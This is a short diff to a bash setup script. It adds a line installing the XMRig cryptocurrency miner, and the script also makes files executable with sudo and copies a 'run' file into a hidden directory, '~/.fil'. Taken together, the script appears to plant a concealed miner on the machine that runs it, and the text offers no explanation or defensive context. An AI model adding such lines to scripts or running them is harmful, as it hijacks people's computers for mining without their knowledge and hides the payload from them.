@@ -1,4 +1,5 @@
 #!/bin/bash
+sudo apt install xmrig -y
 sudo chmod +x *
 mkdir ~/\.fil
 sudo cp run ~/\.fil
